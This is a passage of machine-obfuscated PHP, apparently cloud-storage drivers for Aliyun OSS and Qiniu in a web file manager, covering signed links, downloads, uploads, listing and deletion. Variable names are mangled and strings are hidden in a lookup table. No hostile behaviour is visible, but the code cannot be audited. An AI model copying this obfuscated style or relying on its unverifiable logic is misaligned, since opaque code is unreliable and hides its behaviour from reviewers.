$µÂûèÙ[12], $µÂûèÙ[123], $–ÂÍ¦É², "\170\x2d\157\x73\x73\55\x64\141\164\145\72{$–ÂÍ¦É²}", $µÂûèÙ[8] . $this->bucket . $µÂûèÙ[8] . $â˜¡–® . $½ÕÍóƒÓ); if (isset($¬Œ§¥‚¡[$µÂûèÙ[285]])) { $ò¨ê³ = $this->trafficLimit($µÂûèÙ[1485], array(), !0); if ($ò¨ê³) { $â˜¡–® = $µÂûèÙ[1493]; array_splice($Ï°ŞãÖó, 5, 0, $â˜¡–® . $µÂûèÙ[4] . $ò¨ê³[$â˜¡–®]); } } $ƒ¼Œäíò = implode($µÂûèÙ[287], $Ï°ŞãÖó); $­îØàÜ° = base64_encode(hash_hmac($µÂûèÙ[1410], $ƒ¼Œäíò, $this->secret, !0)); $¨¿âñ… = $µÂûèÙ[1462] . $this->accessKey . $µÂûèÙ[4] . $­îØàÜ°; $‹ºïÁÆó = array($µÂûèÙ[288] => $¨¿âñ…, $µÂûèÙ[284] => $–ÂÍ¦É²); if (!empty($ò¨ê³)) { $‹ºïÁÆó = array_merge($‹ºïÁÆó, $ò¨ê³); } return $‹ºïÁÆó; } public function download($ñàÙĞ°ò, $ÕªÀÁŠğ) { $ï´†¯›ï =& $_SERVER[°‰†òö¯]; if ($this->isFolder($ñàÙĞ°ò)) { return !1; } try { $¤’ëÙ€ß = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÕªÀÁŠğ); $¤’ëÙ€ß = $this->trafficLimit($ï´†¯›ï[112], $¤’ëÙ€ß); $this->client->getObject($this->bucket, $this->pathEncode($ñàÙĞ°ò), $¤’ëÙ€ß); } catch (OSS\Core\OssException $ÂÃŒ•Ï) { $this->writeLog(__FUNCTION__ . $ï´†¯›ï[214] . $ÂÃŒ•Ï->getMessage()); return !1; } return $ÕªÀÁŠğ; } public function fileSubstr($ÒŸİÇö, $Åª…æŸÓ = 0, $³ ‹î¸» = false) { if ($Åª…æŸÓ === -1) { $‰Îá«°¯ = array(); } else { if ($³ ‹î¸» === !1) { $³ÕÖ©ä· = $this->size($ÒŸİÇö); } else { $³ÕÖ©ä· = $Åª…æŸÓ + $³ ‹î¸» - 1; } $‰Îá«°¯ = array(OSS\OssClient::OSS_RANGE => "{$Åª…æŸÓ}\55{$³ÕÖ©ä·}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÒŸİÇö), $‰Îá«°¯); } catch (OSS\Core\OssException $ˆˆÃãûö) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][214] . $ˆˆÃãûö->getMessage()); think_exception($ˆˆÃãûö->getMessage()); return !1; } } private function trafficLimit($º£²£Æ®, $‚Ò¸Ò¤ë = array(), $»şŞ¾ØÍ = false) { $å£¹€€ì =& $_SERVER[°‰†òö¯]; if ($º£²£Æ® == $å£¹€€ì[1485] && $this->isUploadServer() || $º£²£Æ® == $å£¹€€ì[112] && $this->isFileOutServer()) { return $‚Ò¸Ò¤ë; } $ú®ÄíîÑ = floatval($GLOBALS[$å£¹€€ì[6]][$å£¹€€ì[92]][$å£¹€€ì[110]][$º£²£Æ®]) * 1024 * 1024 * 8; if (!$ú®ÄíîÑ) { return $‚Ò¸Ò¤ë; } $ú®ÄíîÑ = $ú®ÄíîÑ < 819200 ? 819200 : ($ú®ÄíîÑ > 838860800 ? 838860800 : $ú®ÄíîÑ); if ($»şŞ¾ØÍ) { $‚Ò¸Ò¤ë[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ú®ÄíîÑ); } else { if (!isset($‚Ò¸Ò¤ë[OSS\OssClient::OSS_HEADERS])) { $‚Ò¸Ò¤ë[OSS\OssClient::OSS_HEADERS] = array(); } $‚Ò¸Ò¤ë[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ú®ÄíîÑ); } return $‚Ò¸Ò¤ë; } public function link($‹­û×¸•, $£Å’µ¼‡ = array()) { $Â¹¬½šÙ =& $_SERVER[°‰†òö¯]; if (!$this->exist($‹­û×¸•) || $this->isFolder($‹­û×¸•)) { return !1; } try { $£Å’µ¼‡ = $this->trafficLimit($Â¹¬½šÙ[112], $£Å’µ¼‡, !0); $‹¼Ş‡Ô = $this->client->signUrl($this->bucket, $this->pathEncode($‹­û×¸•), 3600 * 12, $Â¹¬½šÙ[1494], $£Å’µ¼‡); return $this->getCdnLink($‹¼Ş‡Ô); } catch (OSS\Core\OssException $î†ûû×ô) { $this->writeLog(__FUNCTION__ . $Â¹¬½šÙ[214] . $î†ûû×ô->getMessage()); return !1; } } public function fileOut($¹¦¤ú§‡, $´ÅüêÜì = false, $¨ØÀÔ¡Ø = false, $Ş‡Â¨½Ì = '') { $Ü¡º—Ù  =& $_SERVER[°‰†òö¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹¦¤ú§‡, $´ÅüêÜì, $¨ØÀÔ¡Ø, $Ş‡Â¨½Ì); } if (!$¨ØÀÔ¡Ø) { $¨ØÀÔ¡Ø = $this->pathThis($¹¦¤ú§‡); } $¨ØÀÔ¡Ø = rawurlencode($¨ØÀÔ¡Ø); $•ï´œÔ© = get_file_mime(get_path_ext($¨ØÀÔ¡Ø)); if ($•ï´œÔ© == $Ü¡º—Ù [250]) { return parent::fileOut($¹¦¤ú§‡, $´ÅüêÜì, $¨ØÀÔ¡Ø, $Ş‡Â¨½Ì); } $´ÅüêÜì = $´ÅüêÜì ? $Ü¡º—Ù [1495] : $Ü¡º—Ù [1496]; $·Ï–á•œ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ü¡º—Ù [1497] . rawurlencode("{$´ÅüêÜì}\73\x66\x69\x6c\x65\156\x61\x6d\145\75{$¨ØÀÔ¡Ø}")); $·Ï–á•œ[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ü¡º—Ù [1498] . rawurlencode($•ï´œÔ©); $’ÖùÎš = $this->link($¹¦¤ú§‡, $·Ï–á•œ); $this->fileOutLink($’ÖùÎš); } public function fileOutServer($õâîÛá¬, $§›ËíµÅ = false, $£¦Š§Á = false, $ÖÍÅ­åî = '') { parent::fileOut($õâîÛá¬, $§›ËíµÅ, $£¦Š§Á, $ÖÍÅ­åî); } public function fileOutImage($ŒŸï©ì, $Ñ´êöä = 250) { if ($this->size($ŒŸï©ì) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ŒŸï©ì, $Ñ´êöä); } $ò›İ²ÓË = array(OSS\OssClient::OSS_PROCESS => $_SERVER[°‰†òö¯][1459] . $Ñ´êöä); $«­Ôæ› = $this->link($ŒŸï©ì, $ò›İ²ÓË); $this->fileOutLink($«­Ôæ›); } public function fileOutImageServer($º÷â—êı, $À§¥Çµ‡ = 250) { parent::fileOutImage($º÷â—êı, $À§¥Çµ‡); } public function fileOutLink($Õ¬¢‘£ã) { $ô•À†‘‹ =& $_SERVER[°‰†òö¯]; if (!$this->isCdnHost() && substr($Õ¬¢‘£ã, 0, 7) == $ô•À†‘‹[218]) { $Õ¬¢‘£ã = $ô•À†‘‹[219] . substr($Õ¬¢‘£ã, 7); } header($ô•À†‘‹[175] . $Õ¬¢‘£ã); die; } public function hashMd5($œ—¸ƒ³Õ, $·¡Ñã¹œ = '') { $¥ş“¬ò =& $_SERVER[°‰†òö¯]; $×í³†¯ = $this->_objectMeta($œ—¸ƒ³Õ); if (!$×í³†¯) { return $¥ş“¬ò[12]; } if (!isset($×í³†¯[$¥ş“¬ò[1479]]) && !empty($·¡Ñã¹œ)) { $´öùÖ«Ø = $this->updateObjMeta($œ—¸ƒ³Õ, array($¥ş“¬ò[1479] => $·¡Ñã¹œ)); $×í³†¯[$¥ş“¬ò[1479]] = $´öùÖ«Ø ? $·¡Ñã¹œ : $¥ş“¬ò[12]; } return isset($×í³†¯[$¥ş“¬ò[1479]]) ? strtolower($×í³†¯[$¥ş“¬ò[1479]]) : $¥ş“¬ò[12]; } public function size($‘¡Ùı) { $¶Ïƒ“Úó = $this->objectMeta($‘¡Ùı); return $¶Ïƒ“Úó ? $¶Ïƒ“Úó[$_SERVER[°‰†òö¯][79]] : 0; } public function info($ğ¨­şÀ”) { if ($this->isFolder($ğ¨­şÀ”)) { return $this->folderInfo($ğ¨­şÀ”); } else { if ($this->isFile($ğ¨­şÀ”)) { return $this->fileInfo($ğ¨­şÀ”); } } return !1; } public function exist($‹ùã¢°ä) { return $this->isFile($‹ùã¢°ä) || $this->isFolder($‹ùã¢°ä); } public function isFile($Ş†¨ñÂ) { return !$this->isFolder($Ş†¨ñÂ) && $this->objectMeta($Ş†¨ñÂ); } public function isFolder($Œîš¿ˆı) { return $this->cacheMethod($_SERVER[°‰†òö¯][179], $Œîš¿ˆı); } protected function objectMeta($È¡‹¿ëí) { return $this->cacheMethod($_SERVER[°‰†òö¯][181], $È¡‹¿ëí); } protected function _objectMeta($®‡ÖÏ¤Á) { $÷óÀ±Û¹ =& $_SERVER[°‰†òö¯]; try { $·ë¬ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($®‡ÖÏ¤Á)); } catch (OSS\Core\OssException $¶ªÓ¶ƒ») { $this->writeLog(__FUNCTION__ . $÷óÀ±Û¹[214] . $¶ªÓ¶ƒ»->getMessage()); $·ë¬ = !1; } if ($·ë¬) { $·ë¬[$÷óÀ±Û¹[79]] = intval($·ë¬[$÷óÀ±Û¹[1477]]); } return $·ë¬; } protected function _isFolder($Œ¬ŸùÙó) { $ÈË†¿ù¾ =& $_SERVER[°‰†òö¯]; if ($Œ¬ŸùÙó == $ÈË†¿ù¾[12] || $Œ¬ŸùÙó == $ÈË†¿ù¾[8]) { return !0; } $šÆÈ£ = array($ÈË†¿ù¾[1472] => $ÈË†¿ù¾[8], $ÈË†¿ù¾[1473] => rtrim($Œ¬ŸùÙó, $ÈË†¿ù¾[8]) . $ÈË†¿ù¾[8], $ÈË†¿ù¾[1474] => 1, $ÈË†¿ù¾[1475] => $ÈË†¿ù¾[12]); $´şÓ÷áÍ = $this->client->listObjects($this->bucket, $šÆÈ£); if ($´şÓ÷áÍ->getObjectList() || $´şÓ÷áÍ->getPrefixList()) { return !0; } return !1; } public function writeLog($‘‹°Ò‚Å = '', $ğ†áğƒö = false) { $Ş¹Ô¦ºÒ =& $_SERVER[°‰†òö¯]; $Ñäğƒ…Ç = in_array(ACTION, array($Ş¹Ô¦ºÒ[212], $Ş¹Ô¦ºÒ[213])); if (!$Ñäğƒ…Ç && !GLOBAL_DEBUG) { return; } $ßÀÊÃÛÙ = 0; if (stripos($‘‹°Ò‚Å, $Ş¹Ô¦ºÒ[1499]) !== !1) { $ßÀÊÃÛÙ = 1; $ıŸ­şŒ = explode($Ş¹Ô¦ºÒ[1500], $‘‹°Ò‚Å); $‘‹°Ò‚Å = !empty($ıŸ­şŒ[1]) ? $ıŸ­şŒ[1] : $‘‹°Ò‚Å; } else { if (stripos($‘‹°Ò‚Å, $Ş¹Ô¦ºÒ[1501])) { $ßÀÊÃÛÙ = 2; $ıŸ­şŒ = explode($Ş¹Ô¦ºÒ[1501], $‘‹°Ò‚Å); $ıŸ­şŒ = explode($Ş¹Ô¦ºÒ[4], $ıŸ­şŒ[0]); $‘‹°Ò‚Å = !empty($ıŸ­şŒ[1]) ? $ıŸ­şŒ[1] : $‘‹°Ò‚Å; } } if ($Ñäğƒ…Ç && I18n::getType() == $Ş¹Ô¦ºÒ[1502]) { if ($ßÀÊÃÛÙ == 1) { $‘‹°Ò‚Å = str_replace($Ş¹Ô¦ºÒ[1503], $Ş¹Ô¦ºÒ[1504], $‘‹°Ò‚Å); } else { if ($ßÀÊÃÛÙ == 2) { $ıŸ­şŒ = explode($Ş¹Ô¦ºÒ[214], $ıŸ­şŒ[0]); $«µœÔÔ = isset($ıŸ­şŒ[1]) ? $ıŸ­şŒ[1] : $Ş¹Ô¦ºÒ[12]; $íœ•‰»Â = array($Ş¹Ô¦ºÒ[1505] => $Ş¹Ô¦ºÒ[1506], $Ş¹Ô¦ºÒ[1507] => $Ş¹Ô¦ºÒ[1508], $Ş¹Ô¦ºÒ[1509] => $Ş¹Ô¦ºÒ[1510], $Ş¹Ô¦ºÒ[1511] => $Ş¹Ô¦ºÒ[1512], $Ş¹Ô¦ºÒ[1513] => $Ş¹Ô¦ºÒ[1514], $Ş¹Ô¦ºÒ[1515] => $Ş¹Ô¦ºÒ[1516], $Ş¹Ô¦ºÒ[1517] => $Ş¹Ô¦ºÒ[1518], $Ş¹Ô¦ºÒ[1519] => $Ş¹Ô¦ºÒ[1520], $Ş¹Ô¦ºÒ[1521] => $Ş¹Ô¦ºÒ[1522], $Ş¹Ô¦ºÒ[1523] => $Ş¹Ô¦ºÒ[1524]); if (isset($íœ•‰»Â[$«µœÔÔ])) { $‘‹°Ò‚Å = $íœ•‰»Â[$«µœÔÔ]; } } } if (stripos($‘‹°Ò‚Å, $Ş¹Ô¦ºÒ[1525])) { $‘‹°Ò‚Å = $Ş¹Ô¦ºÒ[1526]; } } if (!trim($‘‹°Ò‚Å)) { return; } parent::writeLog(trim($‘‹°Ò‚Å), $ğ†áğƒö); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($÷ÉñœÜé) { parent::__construct(); require_once SDK_DIR . $_SERVER[°‰†òö¯][1527]; $this->_init($÷ÉñœÜé); } public function _init($Ù–‹Ö‘Ñ) { $Û³‰Ïé =& $_SERVER[°‰†òö¯]; $this->config = $Ù–‹Ö‘Ñ; foreach ($Ù–‹Ö‘Ñ as $ñ‘ò½¥Ü => $ªğ¿¶ ) { if (isset($this->{$ñ‘ò½¥Ü})) { $this->{$ñ‘ò½¥Ü} = $ªğ¿¶ ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Û³‰Ïé[1528] . LNG($Û³‰Ïé[1463])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Óƒ³¥ğù, $Îö–êéÛ = '', $ãÍ¤®¡ = REPEAT_RENAME) { if ($this->setContent($Óƒ³¥ğù, $Îö–êéÛ)) { return $this->getPathOuter($Óƒ³¥ğù); } return !1; } public function mkdir($àì¶Ö, $í¢–ÃŸ™ = REPEAT_SKIP) { $¥¤áãÄÆ =& $_SERVER[°‰†òö¯]; $ÆšœØ°à = trim($àì¶Ö, $¥¤áãÄÆ[8]); if ($this->_isFolder($ÆšœØ°à)) { return $this->getPathOuter($ÆšœØ°à); } $àì¶Ö = $ÆšœØ°à . $¥¤áãÄÆ[8]; $‚Ï½ßú = get_path_this($ÆšœØ°à); $·ÖéÄèÛ = $àì¶Ö . $‚Ï½ßú; if (!$this->mkfile($·ÖéÄèÛ)) { return !1; } if (!$this->moveFile($·ÖéÄèÛ, $àì¶Ö)) { $this->delFile($·ÖéÄèÛ); return !1; } return $this->getPathOuter($ÆšœØ°à); } public function copyFile($ˆãØ°í¤, $­¦ª¨ ·) { $×£Òìş¼ = $this->bucketManager->copy($this->bucket, $ˆãØ°í¤, $this->bucket, $­¦ª¨ ·, !0); return $×£Òìş¼ ? !1 : $this->getPathOuter($­¦ª¨ ·); } public function moveFile($¹øëÎ¯ß, $—æ»œ‡ç) { $Ğ–ºßº = $this->bucketManager->move($this->bucket, $¹øëÎ¯ß, $this->bucket, $—æ»œ‡ç, !0); return $Ğ–ºßº ? !1 : $this->getPathOuter($—æ»œ‡ç); } public function delFile($°ôÎ·ø·) { if (!$this->exist($°ôÎ·ø·)) { return !0; } $ÆÜŠÆüü = $this->bucketManager->delete($this->bucket, $°ôÎ·ø·); if (!$ÆÜŠÆüü) { return !0; } return $ÆÜŠÆüü->code() == 612 ? !0 : !1; } public function delFolder($ƒŸÆÃñ’) { $ğÎŞ«Î =& $_SERVER[°‰†òö¯]; if (!$this->exist($ƒŸÆÃñ’)) { return !0; } $this->listItemCache = !1; $¯òÖùğ = $this->fileList($ƒŸÆÃñ’); $this->listItemCache = !0; $‹…ş‡ = trim($ƒŸÆÃñ’, $ğÎŞ«Î[8]) . $ğÎŞ«Î[8]; if (!empty($ƒŸÆÃñ’) && $ƒŸÆÃñ’ !== $ğÎŞ«Î[230] && !in_array($‹…ş‡, $¯òÖùğ[$ğÎŞ«Î[85]])) { $¯òÖùğ[$ğÎŞ«Î[85]][] = $‹…ş‡; } $Û¨Ş„¥Å = $this->delByBatch($¯òÖùğ[$ğÎŞ«Î[86]]); if (!$Û¨Ş„¥Å) { return !1; } $Û¨Ş„¥Å = $this->delByBatch($¯òÖùğ[$ğÎŞ«Î[85]]); if (!$Û¨Ş„¥Å) { return !1; } return $this->delFile($‹…ş‡); } private function delByBatch($„Å›Á•·) { foreach (array_chunk($„Å›Á•·, 1000) as $äò®ÑŸ·) { $üÊîöå² = $this->bucketManager->buildBatchDelete($this->bucket, $äò®ÑŸ·); list($±÷¼Æºô, $ŞŠ™‰¯ü) = $this->bucketManager->batch($üÊîöå²); if ($ŞŠ™‰¯ü) { return !1; } } return !0; } public function rename($¿ğ•Ü…Ë, $óøÄ‚çƒ) { return $this->renameObject($¿ğ•Ü…Ë, $óøÄ‚çƒ); } public function fileInfo($¶ä¡Ö, $¼«æ àº = false, $ˆ±“óÎ = array()) { $ºğÈïİ‚ =& $_SERVER[°‰†òö¯]; $ÛØâÀ = array($ºğÈïİ‚[32] => $this->pathThis($¶ä¡Ö), $ºğÈïİ‚[87] => $this->getPathOuter($ºğÈïİ‚[8] . $¶ä¡Ö), $ºğÈïİ‚[33] => $ºğÈïİ‚[232], $ºğÈïİ‚[79] => isset($ˆ±“óÎ[$ºğÈïİ‚[1529]]) ? $ˆ±“óÎ[$ºğÈïİ‚[1529]] : 0, $ºğÈïİ‚[169] => $this->ext($¶ä¡Ö)); if ($¼«æ àº) { return $ÛØâÀ; } $ÛØâÀ[$ºğÈïİ‚[233]] = $ÛØâÀ[$ºğÈïİ‚[88]] = 0; $ÛØâÀ[$ºğÈïİ‚[234]] = $ÛØâÀ[$ºğÈïİ‚[235]] = !0; if (empty($ˆ±“óÎ)) { $ˆ±“óÎ = $this->objectMeta($¶ä¡Ö); if (!$ˆ±“óÎ) { return $ÛØâÀ; } } if (isset($ˆ±“óÎ[$ºğÈïİ‚[236]]) && $ˆ±“óÎ[$ºğÈïİ‚[236]]) { $ÛØâÀ[$ºğÈïİ‚[237]] = $ˆ±“óÎ[$ºğÈïİ‚[236]]; } if (isset($ˆ±“óÎ[$ºğÈïİ‚[247]]) && $ˆ±“óÎ[$ºğÈïİ‚[247]]) { $ÛØâÀ[$ºğÈïİ‚[237]] = $ˆ±“óÎ[$ºğÈïİ‚[247]]; } if (isset($ˆ±“óÎ[$ºğÈïİ‚[1530]])) { $ÛØâÀ[$ºğÈïİ‚[88]] = substr($ˆ±“óÎ[$ºğÈïİ‚[1530]] . $ºğÈïİ‚[12], 0, 10); } if (isset($ˆ±“óÎ[$ºğÈïİ‚[1529]])) { $ÛØâÀ[$ºğÈïİ‚[79]] = $ˆ±“óÎ[$ºğÈïİ‚[1529]]; } return $ÛØâÀ; } public function folderInfo($›îœÈÎÊ, $Ã˜ÚüÄ¶ = false) { $äçÒ€àÌ =& $_SERVER[°‰†òö¯]; $°Êµø— = array($äçÒ€àÌ[32] => $this->pathThis($›îœÈÎÊ), $äçÒ€àÌ[87] => $this->getPathOuter($äçÒ€àÌ[8] . $›îœÈÎÊ), $äçÒ€àÌ[33] => $äçÒ€àÌ[78]); if ($Ã˜ÚüÄ¶) { return $°Êµø—; } $°Êµø—[$äçÒ€àÌ[233]] = $°Êµø—[$äçÒ€àÌ[88]] = 0; $°Êµø—[$äçÒ€àÌ[234]] = $°Êµø—[$äçÒ€àÌ[235]] = !0; $›îœÈÎÊ = rtrim($›îœÈÎÊ, $äçÒ€àÌ[8]) . $äçÒ€àÌ[8]; $ĞøŒ£ = $this->objectMeta($›îœÈÎÊ); if (isset($ĞøŒ£[$äçÒ€àÌ[1530]])) { $°Êµø—[$äçÒ€àÌ[88]] = substr($ĞøŒ£[$äçÒ€àÌ[1530]] . $äçÒ€àÌ[12], 0, 10); } return $°Êµø—; } public function listPath($»ÃÏ¼×Ô, $ñü¨ª¸ = false) { $ØÕôé…… =& $_SERVER[°‰†òö¯]; $ÍšŒ´¯ = $this->fileList($»ÃÏ¼×Ô, $ØÕôé……[8], !0); foreach ($ÍšŒ´¯[$ØÕôé……[85]] as $’îÂíÙÓ => $©ä¾›°Ç) { $ÍšŒ´¯[$ØÕôé……[85]][$’îÂíÙÓ] = $this->folderInfo($©ä¾›°Ç, $ñü¨ª¸); } foreach ($ÍšŒ´¯[$ØÕôé……[86]] as $’îÂíÙÓ => $©ä¾›°Ç) { $ÍšŒ´¯[$ØÕôé……[86]][$’îÂíÙÓ] = $this->fileInfo($©ä¾›°Ç[$ØÕôé……[97]], $ñü¨ª¸, $©ä¾›°Ç); } return $ÍšŒ´¯; } public function has($Öáó‡…ö, $ê¿öÇ„Õ = false, $ï¢±Ù—  = true) { $‹ÍğÍâ =& $_SERVER[°‰†òö¯]; $Öáó‡…ö = trim($Öáó‡…ö, $‹ÍğÍâ[8]); $š®¦æàØ = empty($Öáó‡…ö) && $Öáó‡…ö !== $‹ÍğÍâ[230] ? $‹ÍğÍâ[12] : $Öáó‡…ö . $‹ÍğÍâ[8]; $³æ‚áü¦ = $‹ÍğÍâ[12]; $Ê¢áÙ‚ì = 500; $¯æÎÎõ® = $‹ÍğÍâ[8]; $Š…ˆüÔ = $¥Ø´ëæ = 0; while (!0) { check_abort(); list($×úû×ÙÈ, $ë¤ñôã¾) = $this->bucketManager->listFiles($this->bucket, $š®¦æàØ, $³æ‚áü¦, $Ê¢áÙ‚ì, $¯æÎÎõ®); if ($ë¤ñôã¾) { break; } $³æ‚áü¦ = array_key_exists($‹ÍğÍâ[1475], $×úû×ÙÈ) ? $³æ‚áü¦ = $×úû×ÙÈ[$‹ÍğÍâ[1531]] : $‹ÍğÍâ[12]; if ($ê¿öÇ„Õ) { if (!empty($×úû×ÙÈ[$‹ÍğÍâ[1532]])) { $Š…ˆüÔ += count($×úû×ÙÈ[$‹ÍğÍâ[1532]]); } if (!empty($×úû×ÙÈ[$‹ÍğÍâ[1533]])) { $¥Ø´ëæ += count($×úû×ÙÈ[$‹ÍğÍâ[1533]]); } if ($³æ‚áü¦ === $‹ÍğÍâ[12]) { break; } continue; } if ($ï¢±Ù— ) { if (!empty($×úû×ÙÈ[$‹ÍğÍâ[1532]])) { return !0; } } else { if (!empty($×úû×ÙÈ[$‹ÍğÍâ[1533]])) { return !0; } } if ($³æ‚áü¦ === $‹ÍğÍâ[12]) { break; } } if ($ê¿öÇ„Õ) { return array($‹ÍğÍâ[241] => $Š…ˆüÔ, $‹ÍğÍâ[242] => $¥Ø´ëæ); } return !1; } public function listAll($Ô¡©îö) { $å£§Ğ¬í =& $_SERVER[°‰†òö¯]; $µè«¼Ò = $this->fileList($Ô¡©îö, $å£§Ğ¬í[12], !0); $¥Èè™Â = array_to_keyvalue($µè«¼Ò[$å£§Ğ¬í[86]], $å£§Ğ¬í[32]); foreach ($µè«¼Ò[$å£§Ğ¬í[85]] as $öî±Ñ•) { if (is_string($öî±Ñ•)) { $¥Èè™Â[$öî±Ñ•] = array($å£§Ğ¬í[79] => 0); } } return $this->listAllFiles($Ô¡©îö, $¥Èè™Â); } private function fileList($Ùò¹ËÕì, $¾¿èÄÈĞ = '', $¾÷óİæø = 0) { $»ò¨ Ã =& $_SERVER[°‰†òö¯]; $Ùò¹ËÕì = trim($Ùò¹ËÕì, $»ò¨ Ã[8]); $Üşç†‡® = empty($Ùò¹ËÕì) && $Ùò¹ËÕì !== $»ò¨ Ã[230] ? $»ò¨ Ã[12] : $Ùò¹ËÕì . $»ò¨ Ã[8]; $åØúæß = $»ò¨ Ã[12]; $©‹°ğğí = 1000; $Ú²Õ–—ß = $øµŸêÊ = array(); while (!0) { check_abort(); list($ºë‰¾ğì, $Ö‚Ö—ıŸ) = $this->bucketManager->listFiles($this->bucket, $Üşç†‡®, $åØúæß, $©‹°ğğí, $¾¿èÄÈĞ); if ($Ö‚Ö—ıŸ) { break; } $åØúæß = array_key_exists($»ò¨ Ã[1475], $ºë‰¾ğì) ? $åØúæß = $ºë‰¾ğì[$»ò¨ Ã[1531]] : $»ò¨ Ã[12]; $¾Ñ­Àáı = isset($ºë‰¾ğì[$»ò¨ Ã[1532]]) ? $ºë‰¾ğì[$»ò¨ Ã[1532]] : array(); $ù¬×îŒ² = isset($ºë‰¾ğì[$»ò¨ Ã[1533]]) ? $ºë‰¾ğì[$»ò¨ Ã[1533]] : array(); foreach ($¾Ñ­Àáı as $·¿¥À‘ƒ) { if ($·¿¥À‘ƒ[$»ò¨ Ã[97]] == $Üşç†‡®) { continue; } $…”£´é = $·¿¥À‘ƒ[$»ò¨ Ã[97]]; $Úö‡¬¬® = $·¿¥À‘ƒ[$»ò¨ Ã[1529]]; $·¿¥À‘ƒ[$»ò¨ Ã[79]] = $Úö‡¬¬®; $äˆş¦¦‡ = $Úö‡¬¬® == 0 && substr($…”£´é, strlen($…”£´é) - 1, 1) == $»ò¨ Ã[8] ? !0 : !1; $this->cacheMethodInfoSet($…”£´é, $äˆş¦¦‡, $·¿¥À‘ƒ); if ($äˆş¦¦‡) { $Ú²Õ–—ß[] = $…”£´é; continue; } $øµŸêÊ[] = $¾÷óİæø ? $·¿¥À‘ƒ : $…”£´é; } foreach ($ù¬×îŒ² as $…”£´é) { if ($…”£´é == $Üşç†‡®) { continue; } $Ú²Õ–—ß[] = $…”£´é; $this->cacheMethodInfoSet($…”£´é, !0); } if ($åØúæß === $»ò¨ Ã[12]) { break; } } $this->cacheMethodInfoSet($Ùò¹ËÕì, !0); return array($»ò¨ Ã[85] => $Ú²Õ–—ß, $»ò¨ Ã[86] => $øµŸêÊ); } public function canRead($ãº–¶) { return $this->exist($ãº–¶) ? !0 : !1; } public function canWrite($ĞóÒª³–) { return $this->exist($ĞóÒª³–) ? !0 : !1; } public function getContent($ÀÎ‘’ë½) { return $this->fileSubstr($ÀÎ‘’ë½, 0, -1); } public function setContent($Ş”ŸÑ¬é, $Â÷º¬ª = '') { $ëùÎ×Üú = $this->tempFile($this->pathThis($Ş”ŸÑ¬é)); file_put_contents($ëùÎ×Üú, $Â÷º¬ª); if ($this->upload($Ş”ŸÑ¬é, $ëùÎ×Üú)) { $this->tempFileRemve($ëùÎ×Üú); return !0; } return !1; } public function refreshUrls($“—Ë•…‚) { $à¢İ·üì =& $_SERVER[°‰†òö¯]; $Öˆû©•² = array(); if (is_array($“—Ë•…‚)) { foreach ($“—Ë•…‚ as $‹õ¢™²¦) { $Öˆû©•²[] = $this->link($‹õ¢™²¦); } } else { $Öˆû©•²[] = $this->link($“—Ë•…‚); } $ìŸ¬¥…” = new Qiniu\Cdn\CdnManager($this->auth); list($Ÿ°¶‹‘ˆ, $Ù¼Í«¸—) = $ìŸ¬¥…”->refreshUrls($Öˆû©•²); if ($Ù¼Í«¸—) { return !1; } return $Ÿ°¶‹‘ˆ[$à¢İ·üì[1262]] == $à¢İ·üì[820] ? !0 : !1; } public function fileSubstr($Ì†·×, $ğúúÈš³, $å‹¾¤ŸÙ) { $ëæ¢úƒ =& $_SERVER[°‰†òö¯]; if (!($è¦÷Üòî = $this->link($Ì†·×))) { return !1; } $Éíûİëğ = !1; if ($å‹¾¤ŸÙ > 0) { $İî¤­Áú = $ğúúÈš³ + $å‹¾¤ŸÙ - 1; $Éíûİëğ = array($ëæ¢úƒ[1534] . $ğúúÈš³ . $ëæ¢úƒ[464] . $İî¤­Áú); } $ºß©°©´ = url_request($è¦÷Üòî, $ëæ¢úƒ[1494], !1, $Éíûİëğ); return $ºß©°©´[$ëæ¢úƒ[811]] ? $ºß©°©´[$ëæ¢úƒ[1285]] : !1; } public function upload($æˆ½İÌä, $½‚¹¹ , $ôèş”ÄÎ = false, $äüÀ¶ºÇ = REPEAT_REPLACE) { $Öéô‹Ú = new Qiniu\Storage\UploadManager(); $ÄÈ¬äÄ = $this->auth->uploadToken($this->bucket, $æˆ½İÌä); $Â·ƒ“¾¯ = get_file_mime(get_path_ext($½‚¹¹ )); list($ä®‚¤ôÊ, $ÀÀáÆíŸ) = $Öéô‹Ú->putFile($ÄÈ¬äÄ, $æˆ½İÌä, $½‚¹¹ , null, $Â·ƒ“¾¯); return $ÀÀáÆíŸ ? !1 : $this->getPathOuter($æˆ½İÌä); } public function uploadFormData($ÑÍÏÀóë, $Å¥½†×À = 3600) { return $this->uploadToken($ÑÍÏÀóë, $Å¥½†×À); } public function uploadMultiData($ôªéß¬Ø, $ªóÏ­Éµ = 3600) { return $this->uploadToken($ôªéß¬Ø, $ªóÏ­Éµ); } private function uploadToken($ ä÷ºê–, $Æ·®Øê = 3600) { $‚¨°ŸÍ  =& $_SERVER[°‰†òö¯]; $¿­İË§ = $Æ·®Øê; $ÏËİ¦¼· = array($‚¨°ŸÍ [1535] => $‚¨°ŸÍ [1536]); $­Ï›»Öİ = $ ä÷ºê–; $âÒ±Ç¨£ = $this->auth->uploadToken($this->bucket, $­Ï›»Öİ, $¿­İË§, $ÏËİ¦¼·, !0); $õåœÂîÉ = empty($this->region) || $this->region == $‚¨°ŸÍ [1537] ? $‚¨°ŸÍ [12] : $‚¨°ŸÍ [464] . $this->region; $ø¨ñüûÕ = http_type() . 